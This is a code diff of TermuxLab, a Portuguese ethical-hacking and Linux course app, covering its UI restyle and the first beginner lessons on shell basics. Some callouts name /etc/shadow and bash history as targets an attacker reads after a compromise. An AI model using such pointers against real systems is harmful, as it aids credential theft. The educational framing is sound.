+.badges-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:0 16px 16px}
+.badge-card{background:var(--white);border:1px solid var(--border);border-radius:10px;padding:12px;text-align:center}
+.badge-card.earned{border-color:#f59e0b;background:var(--yellow-bg)}
+.badge-card.locked{opacity:.38;filter:grayscale(1)}
+.badge-ico{font-size:1.6rem;margin-bottom:5px}
+.badge-nm{font-size:.7rem;font-weight:600;color:var(--dark)}
+.badge-dt{font-size:.62rem;color:var(--muted);margin-top:2px}
 
-/* ── TOAST ── */
-.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--dark);color:white;padding:10px 20px;border-radius:var(--r);font-size:.84rem;font-weight:500;z-index:999;opacity:0;transition:all .3s;pointer-events:none;white-space:nowrap}
+/* HOME (landing) */
+.hero{padding:40px 16px 28px;text-align:center;background:linear-gradient(180deg,#eff6ff 0%,var(--bg) 100%)}
+.hero-badge{display:inline-flex;align-items:center;gap:5px;background:var(--blue-bg);border:1px solid var(--blue-light);color:var(--blue);font-size:.72rem;font-weight:600;padding:4px 11px;border-radius:20px;margin-bottom:16px}
+.hero h1{font-size:clamp(1.9rem,8vw,2.8rem);font-weight:900;letter-spacing:-.03em;line-height:1.05;color:var(--dark);margin-bottom:8px}
+.hero h1 span{color:var(--blue)}
+.hero p{font-size:.9rem;color:var(--muted);max-width:360px;margin:0 auto 24px;line-height:1.7}
+.hero-ctas{display:flex;flex-direction:column;gap:9px;max-width:280px;margin:0 auto 32px}
+.hero-stats{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;padding-top:24px;border-top:1px solid var(--border)}
+.hs-n{font-size:1.5rem;font-weight:900;color:var(--blue);display:block;letter-spacing:-.03em}
+.hs-l{font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
+
+/* TOAST */
+.toast{position:fixed;bottom:72px;left:50%;transform:translateX(-50%) translateY(10px);background:var(--dark);color:#fff;padding:9px 18px;border-radius:8px;font-size:.82rem;font-weight:500;z-index:999;opacity:0;transition:all .25s;pointer-events:none;white-space:nowrap;max-width:90vw}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
-.toast.success{background:var(--green);color:var(--dark)}
-.toast.error{background:var(--red)}
+.toast.ok{background:var(--green)}
+.toast.bad{background:var(--red)}
 
-/* ── LOADING ── */
-.loading{display:flex;align-items:center;justify-content:center;height:200px;color:var(--muted);font-size:.9rem}
-.spinner{width:20px;height:20px;border:2px solid var(--border);border-top-color:var(--blue2);border-radius:50%;animation:spin .7s linear infinite;margin-right:10px}
-@keyframes spin{to{transform:rotate(360deg)}}
+/* PROGRESS IN LIST */
+.prog-overview{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:14px 16px;margin-bottom:12px}
+.prog-ov-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.prog-ov-top h3{font-weight:700;font-size:.88rem;color:var(--dark)}
+.prog-ov-top span{font-size:.78rem;color:var(--muted)}
+.prog-bg{height:7px;background:var(--border);border-radius:7px;overflow:hidden}
+.prog-fg{height:100%;background:linear-gradient(90deg,var(--blue),var(--purple));border-radius:7px;transition:width .5s}
+
+/* MODULE HEADER */
+.mod-header{font-size:.68rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;padding:12px 0 4px}
+
+/* COMPLETE BTN */
+.complete-btn{background:linear-gradient(135deg,var(--green),#059669);color:#fff}
+.complete-btn:active{background:var(--green)}
+.complete-btn.done{background:var(--green-bg);color:var(--green);border:1px solid var(--green-light);cursor:default}
 </style>
 </head>
 <body>
 
-<!-- TOAST -->
 <div class="toast" id="toast"></div>
 
-<!-- ═══════════════ HOME ═══════════════ -->
-<div id="page-home" class="page active">
-  <nav>
-    <div class="nav-logo" onclick="goHome()">
-      <div class="nav-logo-icon">&gt;_</div>
+<!-- ████████ HOME ████████ -->
+<div class="screen on" id="s-home">
+  <div class="nav">
+    <div class="nav-logo">
+      <div class="nav-logo-ico">&gt;_</div>
       TermuxLab
     </div>
-    <div class="nav-actions" id="nav-actions">
-      <button class="btn btn-outline" onclick="showPage('login')">Entrar</button>
-      <button class="btn btn-primary" onclick="showPage('register')">Registar</button>
-    </div>
-  </nav>
-
-  <div class="hero">
-    <div class="hero-badge">🔒 Hacking Ético · Linux · Cibersegurança</div>
-    <h1>Domina o <span>Linux</span><br>no Android</h1>
-    <p>Do terminal ao hacking ético — aprende com aulas interactivas, exercícios reais e terminal integrado. Directamente no teu telemóvel.</p>
-    <div class="hero-ctas">
-      <button class="btn btn-primary btn-large btn-full" onclick="showPage('register')">Começar Grátis →</button>
-      <button class="btn btn-outline btn-large btn-full" onclick="showPage('login')">Já tenho conta</button>
-    </div>
-    <div class="hero-stats">
-      <div><span class="stat-n">13+</span><div class="stat-l">Aulas</div></div>
-      <div><span class="stat-n">5</span><div class="stat-l">Módulos</div></div>
-      <div><span class="stat-n">100%</span><div class="stat-l">Grátis</div></div>
-      <div><span class="stat-n">Android</span><div class="stat-l">Nativo</div></div>
+    <div class="nav-right">
+      <button class="btn btn-secondary" onclick="go('login')">Entrar</button>
+      <button class="btn btn-primary" onclick="go('register')">Registar</button>
     </div>
   </div>
-
-  <div class="section">
-    <h2 class="section-title">Porquê o TermuxLab?</h2>
-    <p class="section-sub">Tudo o que precisas para aprender segurança no Android</p>
-    <div class="features-grid">
-      <div class="feature-card">
-        <div class="feature-icon fi-blue">📚</div>
-        <h3>Aulas Completas</h3>
-        <p>Do terminal básico ao pentesting avançado. Cada aula com profundidade real, sem resumos.</p>
+  <div style="overflow-y:auto;flex:1;padding-bottom:20px">
+    <div class="hero">
+      <div class="hero-badge">🔒 Hacking Ético · Linux · Cibersegurança</div>
+      <h1>Domina o <span>Linux</span><br>no Android</h1>
+      <p>Do terminal ao hacking ético — aprende com aulas interactivas, exercícios reais e terminal integrado.</p>
+      <div class="hero-ctas">
+        <button class="btn btn-primary btn-lg btn-block" onclick="go('register')">Começar Grátis →</button>
+        <button class="btn btn-secondary btn-lg btn-block" onclick="go('login')">Já tenho conta</button>
       </div>
-      <div class="feature-card">
-        <div class="feature-icon fi-green">⚡</div>
-        <h3>Terminal Interactivo</h3>
-        <p>Pratica comandos directamente na aula. Simulação completa de bash integrada em cada secção.</p>
+      <div class="hero-stats">
+        <div><span class="hs-n">13+</span><div class="hs-l">Aulas</div></div>
+        <div><span class="hs-n">5</span><div class="hs-l">Módulos</div></div>
+        <div><span class="hs-n">100%</span><div class="hs-l">Grátis</div></div>
       </div>
-      <div class="feature-card">
-        <div class="feature-icon fi-purple">⭐</div>
-        <h3>Progresso e Badges</h3>
-        <p>Acompanha a tua evolução, ganha badges e mantém motivação ao longo da jornada.</p>
+    </div>
+    <div style="padding:16px;display:flex;flex-direction:column;gap:10px">
+      <div class="card">
+        <div style="font-size:1.4rem;margin-bottom:8px">📚</div>
+        <div style="font-weight:700;font-size:.95rem;margin-bottom:5px">13 Aulas Completas</div>
+        <div style="font-size:.83rem;color:var(--muted);line-height:1.65">Do terminal básico ao pentesting avançado. Cada aula com profundidade real, sem resumos nem atalhos.</div>
       </div>
-      <div class="feature-card">
-        <div class="feature-icon fi-yellow">🎯</div>
-        <h3>Perspectiva de Hacker</h3>
-        <p>Cada conceito explicado com o contexto de segurança real — como atacar e como defender.</p>
+      <div class="card">
+        <div style="font-size:1.4rem;margin-bottom:8px">⚡</div>
+        <div style="font-weight:700;font-size:.95rem;margin-bottom:5px">Terminal Interactivo</div>
+        <div style="font-size:.83rem;color:var(--muted);line-height:1.65">Pratica comandos bash directamente dentro de cada aula. Simulação completa integrada.</div>
+      </div>
+      <div class="card">
+        <div style="font-size:1.4rem;margin-bottom:8px">🎯</div>
+        <div style="font-weight:700;font-size:.95rem;margin-bottom:5px">Perspectiva de Hacker</div>
+        <div style="font-size:.83rem;color:var(--muted);line-height:1.65">Cada conceito explicado com contexto de segurança real — como atacar e como defender.</div>
+      </div>
+      <div class="card">
+        <div style="font-size:1.4rem;margin-bottom:8px">⭐</div>
+        <div style="font-weight:700;font-size:.95rem;margin-bottom:5px">Progresso e Badges</div>
+        <div style="font-size:.83rem;color:var(--muted);line-height:1.65">Acompanha a tua evolução, ganha badges e mantém a motivação ao longo da jornada.</div>
       </div>
     </div>
   </div>
-
-  <div class="cta-section">
-    <h2>Pronto para aprender?</h2>
-    <p>Junta-te a centenas de estudantes que já estão a dominar o Linux no Android.</p>
-    <button class="btn btn-white btn-large" onclick="showPage('register')">Começar Agora →</button>
-  </div>
-
-  <footer>
-    <div class="footer-brand">
-      <div class="nav-logo-icon" style="width:24px;height:24px;font-size:.65rem">&gt;_</div>
-      TermuxLab
-    </div>
-    <p class="footer-desc">A plataforma mais completa de cibersegurança e Linux para Android. Construída para quem quer aprender a sério.</p>
-    <div class="footer-links">
-      <h4>Links</h4>
-      <a href="#" onclick="showPage('register')">Criar Conta</a>
-      <a href="#" onclick="showPage('login')">Entrar</a>
-    </div>
-    <div class="footer-bottom">© 2026 TermuxLab — Todos os direitos reservados</div>
-  </footer>
 </div>
 
-<!-- ═══════════════ LOGIN ═══════════════ -->
-<div id="page-login" class="page">
-  <nav>
-    <div class="nav-logo" onclick="goHome()"><div class="nav-logo-icon">&gt;_</div>TermuxLab</div>
-  </nav>
-  <div class="auth-page">
+<!-- ████████ LOGIN ████████ -->
+<div class="screen" id="s-login">
+  <div class="nav">
+    <div class="nav-logo" onclick="go('home')">
+      <div class="nav-logo-ico">&gt;_</div>TermuxLab
+    </div>
+  </div>
+  <div class="auth-wrap">
     <div class="auth-card">
-      <div class="auth-header">
-        <div class="auth-logo">🔐</div>
+      <div class="auth-head">
+        <div class="auth-ico">🔐</div>
         <h2>Entrar na conta</h2>
         <p>Bem-vindo de volta ao TermuxLab</p>
       </div>
-      <div class="auth-error" id="login-error"></div>
-      <div class="form-group">
-        <label class="form-label">✉️ Email</label>
-        <input class="form-input" type="email" id="login-email" placeholder="o-teu@email.com">
+      <div class="auth-err" id="login-err"></div>
+      <div class="form-grp">
+        <label class="form-lbl">Email</label>
+        <input class="form-inp" type="email" id="li-email" placeholder="o-teu@email.com" autocomplete="email">
       </div>
-      <div class="form-group">
-        <label class="form-label">🔒 Password</label>
-        <input class="form-input" type="password" id="login-password" placeholder="••••••••">
+      <div class="form-grp">
+        <label class="form-lbl">Password</label>
+        <input class="form-inp" type="password" id="li-pass" placeholder="••••••••" autocomplete="current-password">
       </div>
-      <button class="btn btn-primary btn-full" style="padding:13px" onclick="doLogin()">Entrar</button>
-      <div class="auth-divider"></div>
-      <div class="auth-switch">Não tens conta? <a onclick="showPage('register')">Criar agora</a></div>
+      <button class="btn btn-primary btn-block" onclick="doLogin()">Entrar</button>
+      <div class="auth-div"></div>
+      <div class="auth-switch">Não tens conta? <a onclick="go('register')">Criar agora</a></div>
     </div>
   </div>
 </div>
 
-<!-- ═══════════════ REGISTER ═══════════════ -->
-<div id="page-register" class="page">
-  <nav>
-    <div class="nav-logo" onclick="goHome()"><div class="nav-logo-icon">&gt;_</div>TermuxLab</div>
-  </nav>
-  <div class="auth-page" style="background:linear-gradient(135deg,#6d28d9,#ec4899)">
+<!-- ████████ REGISTER ████████ -->
+<div class="screen" id="s-register">
+  <div class="nav">
+    <div class="nav-logo" onclick="go('home')">
+      <div class="nav-logo-ico">&gt;_</div>TermuxLab
+    </div>
+  </div>
+  <div class="auth-wrap" style="background:linear-gradient(135deg,#6d28d9,#db2777)">
     <div class="auth-card">
-      <div class="auth-header">
-        <div class="auth-logo">🚀</div>
+      <div class="auth-head">
+        <div class="auth-ico">🚀</div>
         <h2>Criar conta grátis</h2>
         <p>Junta-te ao TermuxLab hoje</p>
       </div>
-      <div class="auth-error" id="reg-error"></div>
-      <div class="form-group">
-        <label class="form-label">👤 Username</label>
-        <input class="form-input" type="text" id="reg-username" placeholder="o-teu-username">
+      <div class="auth-err" id="reg-err"></div>
+      <div class="form-grp">
+        <label class="form-lbl">Username</label>
+        <input class="form-inp" type="text" id="re-user" placeholder="o-teu-username" autocomplete="username">
       </div>
-      <div class="form-group">
-        <label class="form-label">✉️ Email</label>
-        <input class="form-input" type="email" id="reg-email" placeholder="o-teu@email.com">
+      <div class="form-grp">
+        <label class="form-lbl">Email</label>
+        <input class="form-inp" type="email" id="re-email" placeholder="o-teu@email.com" autocomplete="email">
       </div>
-      <div class="form-group">
-        <label class="form-label">🔒 Password</label>
-        <input class="form-input" type="password" id="reg-password" placeholder="mínimo 6 caracteres">
+      <div class="form-grp">
+        <label class="form-lbl">Password</label>
+        <input class="form-inp" type="password" id="re-pass" placeholder="mínimo 6 caracteres" autocomplete="new-password">
       </div>
-      <div class="form-group">
-        <label class="form-label">🔒 Confirmar Password</label>
-        <input class="form-input" type="password" id="reg-password2" placeholder="repete a password">
+      <div class="form-grp">
+        <label class="form-lbl">Confirmar Password</label>
+        <input class="form-inp" type="password" id="re-pass2" placeholder="repete a password" autocomplete="new-password">
       </div>
-      <button class="btn btn-full" style="background:#8b5cf6;color:white;padding:13px;font-size:.95rem;font-weight:700;border-radius:var(--r2)" onclick="doRegister()">Criar Conta</button>
-      <div class="auth-divider"></div>
-      <div class="auth-switch">Já tens conta? <a onclick="showPage('login')">Entrar</a></div>
+      <button class="btn btn-block" style="background:#7c3aed;color:#fff;padding:13px;font-size:.9rem;font-weight:700;border-radius:8px;cursor:pointer;font-family:var(--sans)" onclick="doRegister()">Criar Conta</button>
+      <div class="auth-div"></div>
+      <div class="auth-switch">Já tens conta? <a onclick="go('login')">Entrar</a></div>
     </div>
   </div>
 </div>
 
-<!-- ═══════════════ LESSONS ═══════════════ -->
-<div id="page-lessons" class="page">
-  <nav>
-    <div class="nav-logo" onclick="goHome()"><div class="nav-logo-icon">&gt;_</div>TermuxLab</div>
-    <div class="nav-actions"><button class="btn btn-ghost" id="nav-username">—</button></div>
-  </nav>
-  <div class="lessons-header">
-    <h1 class="lessons-title">Aulas</h1>
-    <p class="lessons-sub">Aprende Linux e cibersegurança do zero ao avançado</p>
+<!-- ████████ LESSONS LIST ████████ -->
+<div class="screen" id="s-lessons">
+  <div class="nav">
+    <div class="nav-logo"><div class="nav-logo-ico">&gt;_</div>TermuxLab</div>
+    <div class="nav-right"><span id="nav-user" style="font-size:.8rem;color:var(--muted);font-weight:600"></span></div>
   </div>
-  <div class="progress-overview">
-    <div class="progress-overview-top">
-      <h3>O teu progresso</h3>
-      <span id="progress-text">0 / 13 aulas</span>
+  <div class="content" id="lessons-content">
+    <h1 style="font-size:1.3rem;font-weight:800;letter-spacing:-.02em;margin-bottom:4px">Aulas</h1>
+    <p style="font-size:.83rem;color:var(--muted);margin-bottom:14px">Linux e cibersegurança do zero ao avançado</p>
+    <div class="prog-overview">
+      <div class="prog-ov-top">
+        <h3>O teu progresso</h3>
+        <span id="prog-text">0 / 13</span>
+      </div>
+      <div class="prog-bg"><div class="prog-fg" id="prog-bar" style="width:0%"></div></div>
     </div>
-    <div class="progress-bar-bg"><div class="progress-bar-fill" id="progress-bar" style="width:0%"></div></div>
+    <div id="lesson-list"></div>
   </div>
-  <div class="lessons-list" id="lessons-list"></div>
+  <div class="bottom-nav">
+    <button class="bnav-btn active" id="bn-l" onclick="go('lessons')"><span class="ico">📚</span>Aulas</button>
+    <button class="bnav-btn" id="bn-p" onclick="go('profile')"><span class="ico">👤</span>Perfil</button>
+  </div>
 </div>
 
-<!-- ═══════════════ LESSON CONTENT ═══════════════ -->
-<div id="page-lesson" class="page">
-  <nav>
-    <div class="nav-logo" onclick="goHome()"><div class="nav-logo-icon">&gt;_</div>TermuxLab</div>
-  </nav>
-  <div class="lesson-top-bar">
-    <button class="back-btn" onclick="showPage('lessons')">← Aulas</button>
-    <div class="lesson-progress-bar"><div class="lesson-progress-fill" id="lpfill" style="width:0%"></div></div>
+<!-- ████████ LESSON CONTENT ████████ -->
+<div class="screen" id="s-lesson">
+  <div class="nav">
+    <div class="nav-logo"><div class="nav-logo-ico">&gt;_</div>TermuxLab</div>
   </div>
-  <div class="lesson-body" id="lesson-body"></div>
+  <div class="lesson-bar">
+    <button class="back" onclick="go('lessons')">← Aulas</button>
+    <div class="prog-bar"><div class="prog-fill" id="lprog" style="width:0%"></div></div>
+  </div>
+  <div class="content-wide" id="lesson-wrap">
+    <div class="lc-wrap" id="lesson-body"></div>
+  </div>
 </div>
 
-<!-- ═══════════════ PROFILE ═══════════════ -->
-<div id="page-profile" class="page">
-  <nav>
-    <div class="nav-logo" onclick="goHome()"><div class="nav-logo-icon">&gt;_</div>TermuxLab</div>
-    <button class="btn btn-ghost btn-outline" onclick="doLogout()" style="font-size:.78rem;padding:6px 12px">Sair</button>
-  </nav>
-  <div class="profile-hero">
-    <div class="profile-avatar">👤</div>
-    <div class="profile-name" id="p-name">—</div>
-    <div class="profile-email" id="p-email">—</div>
+<!-- ████████ PROFILE ████████ -->
+<div class="screen" id="s-profile">
+  <div class="nav">
+    <div class="nav-logo"><div class="nav-logo-ico">&gt;_</div>TermuxLab</div>
+    <button class="btn btn-ghost" style="font-size:.78rem" onclick="doLogout()">Sair</button>
   </div>
-  <div class="profile-stats">
-    <div class="pstat"><span class="pstat-n" id="p-lessons">0</span><div class="pstat-l">Aulas</div></div>
-    <div class="pstat"><span class="pstat-n" id="p-badges">0</span><div class="pstat-l">Badges</div></div>
-    <div class="pstat"><span class="pstat-n" id="p-pct">0%</span><div class="pstat-l">Progresso</div></div>
-  </div>
-  <div class="badges-section">
-    <div class="badges-title">🏆 Badges</div>
+  <div style="flex:1;overflow-y:auto;padding-bottom:72px">
+    <div class="profile-hero">
+      <div class="profile-av">👤</div>
+      <div class="profile-name" id="p-name">—</div>
+      <div class="profile-email" id="p-email">—</div>
+    </div>
+    <div class="stats-row">
+      <div class="stat-card"><span class="stat-n" id="p-lessons">0</span><div class="stat-l">Aulas</div></div>
+      <div class="stat-card"><span class="stat-n" id="p-badges">0</span><div class="stat-l">Badges</div></div>
+      <div class="stat-card"><span class="stat-n" id="p-pct">0%</span><div class="stat-l">Progresso</div></div>
+    </div>
+    <div style="padding:0 16px 8px"><div style="font-weight:700;font-size:.9rem;color:var(--dark)">🏆 Badges</div></div>
     <div class="badges-grid" id="badges-grid"></div>
   </div>
-</div>
-
-<!-- ═══════════════ BOTTOM NAV ═══════════════ -->
-<div class="bottom-nav" id="bottom-nav" style="display:none">
-  <button class="bnav-item" id="bn-lessons" onclick="showPage('lessons')"><span class="bni">📚</span>Aulas</button>
-  <button class="bnav-item" id="bn-profile" onclick="showPage('profile')"><span class="bni">👤</span>Perfil</button>
+  <div class="bottom-nav">
+    <button class="bnav-btn" id="bn-l2" onclick="go('lessons')"><span class="ico">📚</span>Aulas</button>
+    <button class="bnav-btn active" id="bn-p2" onclick="go('profile')"><span class="ico">👤</span>Perfil</button>
+  </div>
 </div>
 
 <script>
-// ═══════════════════════════════════════
-// STATE
-// ═══════════════════════════════════════
-let currentUser = null;
-let userProgress = [];
-let userBadges = [];
-let currentLesson = 0;
+// ═══════════════ STATE ═══════════════
+var USER = null;
+var PROGRESS = [];
+var BADGES = [];
+var CUR_LESSON = 0;
 
-// ═══════════════════════════════════════
-// LESSONS DATA
-// ═══════════════════════════════════════
-const LESSONS = [
-{
-  id:0, title:"Terminal, Shell e como o Linux pensa",
-  module:"Módulo 1 · Fundamentos Linux", level:"beginner",
-  duration:"50 min",
-  content: buildLesson0()
-},{
-  id:1, title:"Criar, mover, copiar e apagar",
-  module:"Módulo 1 · Fundamentos Linux", level:"beginner",
-  duration:"55 min",
-  content: buildLesson1()
-},{
-  id:2, title:"Permissões, utilizadores e grupos",
-  module:"Módulo 1 · Fundamentos Linux", level:"beginner",
-  duration:"60 min",
-  content: buildLesson2()
-},{
-  id:3, title:"Processos, pipes e redirecionamento",
-  module:"Módulo 1 · Fundamentos Linux", level:"intermediate",
-  duration:"65 min",
-  content: buildLesson3()
-},{
-  id:4, title:"Variáveis de ambiente e .bashrc",
-  module:"Módulo 1 · Fundamentos Linux", level:"intermediate",
-  duration:"45 min",
-  content: buildLesson4()
-},{
-  id:5, title:"Bash Scripting — automação e poder",
-  module:"Módulo 1 · Fundamentos Linux", level:"intermediate",
-  duration:"75 min",
-  content: buildLesson5()
-},{
-  id:6, title:"Modelo OSI, TCP/IP e protocolos",
-  module:"Módulo 2 · Redes", level:"intermediate",
-  duration:"60 min",
-  content: buildLesson6()
-},{
-  id:7, title:"IP, Subnetting, DNS e HTTP",
-  module:"Módulo 2 · Redes", level:"intermediate",
-  duration:"55 min",
-  content: buildLesson7()
-},{
-  id:8, title:"Nmap — reconhecimento de redes",
-  module:"Módulo 2 · Redes", level:"advanced",
-  duration:"70 min",
-  content: buildLesson8()
-},{
-  id:9, title:"Netcat e reconhecimento de serviços",
-  module:"Módulo 2 · Redes", level:"advanced",
-  duration:"50 min",
-  content: buildLesson9()
-},{
-  id:10, title:"Metodologia de Pentest e OSINT",
-  module:"Módulo 3 · Pentesting", level:"advanced",
-  duration:"55 min",
-  content: buildLesson10()
-},{
-  id:11, title:"Enumeração e privilege escalation",
-  module:"Módulo 4 · Scripts", level:"advanced",
-  duration:"60 min",
-  content: buildLesson11()
-},{
-  id:12, title:"CTF — Capture The Flag",
-  module:"Módulo 5 · CTF", level:"advanced",
-  duration:"90 min",
-  content: buildLesson12()
-}
-];
-
-// ═══════════════════════════════════════
-// LESSON BUILDERS — helpers
-// ═══════════════════════════════════════
-function sec(n,title,body){return`<div class="lc-section"><h2><span class="sec-num">${String(n).padStart(2,'0')}</span>${title}</h2>${body}</div>`}
-function cb(lang,code,copy=true){return`<div class="code-block"><div class="code-header"><span class="code-lang">${lang}</span>${copy?'<button class="code-copy-btn" onclick="cpCode(this)">copiar</button>':''}</div><div class="code-body">${code}</div></div>`}
-function tip(icon,t,b){return`<div class="callout c-tip"><span class="callout-icon">${icon}</span><div><b>${t} — </b>${b}</div></div>`}
-function warn(icon,t,b){return`<div class="callout c-warn"><span class="callout-icon">${icon}</span><div><b>${t} — </b>${b}</div></div>`}
-function danger(icon,t,b){return`<div class="callout c-danger"><span class="callout-icon">${icon}</span><div><b>${t} — </b>${b}</div></div>`}
-function hack(b){return`<div class="callout c-hack"><span class="callout-icon">🎯</span><div><b>Perspectiva do Hacker — </b>${b}</div></div>`}
-function tbl(heads,rows){return`<table class="lc-table"><tr>${heads.map(h=>`<th>${h}</th>`).join('')}</tr>${rows.map(r=>`<tr>${r.map(c=>`<td>${c}</td>`).join('')}</tr>`).join('')}</table>`}
-function tryit(commands,label=""){return`<div class="try-it"><div class="try-it-header"><div class="try-it-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><div class="try-it-title">⚡ Experimenta tu mesmo</div></div><div class="try-it-output" id="to-${label}">Escreve um comando abaixo e prime Executar...</div><div class="try-it-input-row"><span class="try-it-prompt-label">~/lab $</span><input class="try-it-input" id="ti-${label}" placeholder="escreve um comando..." onkeydown="if(event.key==='Enter')runCmd('${label}')"><button class="try-it-exec" onclick="runCmd('${label}')">Executar</button></div><div class="try-it-hint">Comandos: ${commands}</div></div>`}
-function ex(code){return`<div class="exercise"><div class="exercise-title">⬡ Exercício Prático</div>${cb("bash",code)}</div>`}
-
-function buildLesson0(){
-return`<div class="lesson-eyebrow">Módulo 1 · Aula 1 de 6</div>
-<h1 class="lesson-h1">Terminal, Shell e como o Linux pensa</h1>
-<div class="lesson-desc">A maioria das pessoas abre o Termux sem saber o que acontece por baixo. Isso cria buracos que se tornam problemas sérios em segurança. Vamos construir desde o alicerce absoluto.</div>`+
-
-sec(1,"O que é o Terminal?",
-`<p>O <b>terminal</b> é uma interface de texto que te permite comunicar com o sistema operativo. No Android, o Termux é o emulador de terminal. Quando abres o Termux vês:</p>`+
-cb("bash",`<span class="ck">~ $</span>  <span class="cm"># o bash está à tua espera</span>`)+
-tip("💡","Termux no Android","O Termux simula um ambiente Linux completo. A tua pasta home fica em <code>/data/data/com.termux/files/home</code> mas o <code>~</code> aponta para lá automaticamente.")
-)+
-
-sec(2,"O que é o Shell?",
-`<p>O terminal é só a <b>janela</b>. O <b>Shell</b> é o programa que interpreta o que escreves e comunica com o kernel.</p>`+
-cb("fluxo",`<span class="co">[Tu] → escreves → [Shell/Bash] → interpreta → [Kernel] → executa → [resultado]</span>`,false)+
-cb("bash",`<span class="ck">echo</span> <span class="cs">$SHELL</span>        <span class="cm"># qual shell estou a usar?</span>
-<span class="ck">echo</span> <span class="cs">$BASH_VERSION</span> <span class="cm"># versão do bash</span>
-<span class="ck">which</span> <span class="cv">bash</span>          <span class="cm"># onde está o bash</span>
-<span class="ck">type</span> <span class="cv">ls</span>            <span class="cm"># ls é builtin ou externo?</span>`)+
-hack("Quando obtens shell remoto em pentest, o prompt revela o SO e privilégios. <code>#</code> = root directamente.")
-)+
-
-sec(3,"Anatomia do Prompt",
-cb("estrutura",`<span class="ck">dawn</span><span class="co">@</span><span class="cv">termuxlab</span><span class="co">:</span><span class="cf">~/lab</span><span class="co">$</span>
-<span class="co">│       │           │      └── $ = normal  (# = root)</span>
-<span class="co">│       │           └── directório actual</span>
-<span class="co">│       └── nome da máquina</span>
-<span class="co">└── utilizador</span>`,false)+
-warn("⚠️","Root vs Normal","O símbolo <code>#</code> significa root — privilégios máximos. Qualquer erro pode apagar o sistema.")
-)+
-
-sec(4,"Filesystem Linux — tudo é uma árvore",
-`<p>No Linux existe <b>um único ponto de partida: <code>/</code></b> (raiz). Tudo — ficheiros, dispositivos, processos — está dentro desta árvore.</p>`+
-cb("árvore",`<span class="ck">/</span>
-<span class="co">├── bin/</span>    <span class="cm">→ binários essenciais: ls, cp, bash</span>
-<span class="co">├── etc/</span>    <span class="cm">→ configurações: passwd, shadow, hosts</span>
-<span class="co">├── home/</span>   <span class="cm">→ pastas dos utilizadores</span>
-<span class="co">│   └── dawn/</span> <span class="cm">→ a tua pasta = ~</span>
-<span class="co">├── var/log/</span> <span class="cm">→ logs do sistema</span>
-<span class="co">├── tmp/</span>    <span class="cm">→ temporários (apagados no reboot)</span>
-<span class="co">└── proc/</span>   <span class="cm">→ processos em memória (virtual)</span>`,false)+
-hack("Os directórios mais importantes em pentest: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/var/log/</code>, <code>/home/</code> e <code>/proc/</code>.")
-)+
-
-sec(5,"Os 3 comandos base de navegação",
-cb("bash",`<span class="ck">pwd</span>          <span class="cm"># onde estou?</span>
-<span class="ck">ls</span>           <span class="cm"># o que há aqui?</span>
-<span class="ck">ls</span> <span class="cf">-la</span>       <span class="cm"># lista longa + ficheiros ocultos</span>
-<span class="ck">ls</span> <span class="cf">-lah</span>      <span class="cm"># + tamanhos legíveis (KB/MB)</span>
-<span class="ck">ls</span> <span class="cf">-laht</span>     <span class="cm"># + ordenado por tempo</span>
-<span class="ck">cd</span> <span class="cs">~</span>         <span class="cm"># vai para a home</span>
-<span class="ck">cd</span> <span class="cv">/</span>         <span class="cm"># vai para a raiz</span>
-<span class="ck">cd</span> <span class="cv">..</span>        <span class="cm"># sobe uma pasta</span>
-<span class="ck">cd</span> <span class="cv">-</span>         <span class="cm"># volta à pasta anterior</span>`)+
-tryit("pwd, ls, cd ~, cd /, cd ..", "l0")
-)+
-
-sec(6,"Atalhos de teclado — velocidade real",
-cb("atalhos",`<span class="cf">Tab</span>      <span class="cm">→ auto-completar (usa SEMPRE)</span>
-<span class="cf">Ctrl+C</span>   <span class="cm">→ interrompe o comando actual</span>
-<span class="cf">Ctrl+L</span>   <span class="cm">→ limpa o ecrã</span>
-<span class="cf">Ctrl+R</span>   <span class="cm">→ pesquisa no histórico</span>
-<span class="cf">↑ / ↓</span>   <span class="cm">→ navegar histórico de comandos</span>
-<span class="cf">!!</span>       <span class="cm">→ repete o último comando</span>`,false)+
-hack("O histórico (<code>~/.bash_history</code>) é a primeira coisa que um atacante lê após comprometer um sistema. Pode conter passwords e comandos sensíveis.")
-)+
-
-ex(`<span class="ck">pwd</span>
-<span class="ck">ls</span> <span class="cf">-la</span>
-<span class="ck">cd</span> /
-<span class="ck">ls</span>
-<span class="ck">cd</span> /etc
-<span class="ck">ls</span> <span class="cf">-la</span>
-<span class="ck">cd</span> <span class="cs">~</span>
-<span class="ck">echo</span> <span class="cs">$SHELL</span>
-<span class="ck">echo</span> <span class="cs">$HOME</span>
-<span class="ck">history</span>`)
+// ═══════════════ NAVIGATION ═══════════════
+function go(screen) {
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on') });
+  var el = document.getElementById('s-' + screen);
+  if (el) el.classList.add('on');
+  window.scrollTo(0,0);
+  if (screen === 'lessons') loadLessons();
+  if (screen === 'profile') loadProfile();
 }
 
-function buildLesson1(){
-return`<div class="lesson-eyebrow">Módulo 1 · Aula 2 de 6</div>
-<h1 class="lesson-h1">Criar, mover, copiar e apagar</h1>
-<div class="lesson-desc">Estas operações são a base de tudo — administração, scripting, hacking, automação. Um hacker que não domina o filesystem está cego.</div>`+
-
-sec(1,"mkdir — Criar Directórios",
-cb("bash",`<span class="ck">mkdir</span> <span class="cv">projetos</span>                     <span class="cm"># cria pasta</span>
-<span class="ck">mkdir</span> <span class="cv">p1 p2 p3</span>                  <span class="cm"># cria várias de uma vez</span>
-<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cv">proj/hack/tools</span>        <span class="cm"># cria toda a árvore</span>
-<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cv">lab/{recon,exploits,loot}</span> <span class="cm"># brace expansion!</span>`)+
-tryit("mkdir lab, mkdir -p lab/tools/nmap", "l1a")
-)+
-
-sec(2,"touch e echo — Criar e escrever ficheiros",
-cb("bash",`<span class="ck">touch</span> <span class="cv">notas.txt</span>               <span class="cm"># cria ficheiro vazio</span>
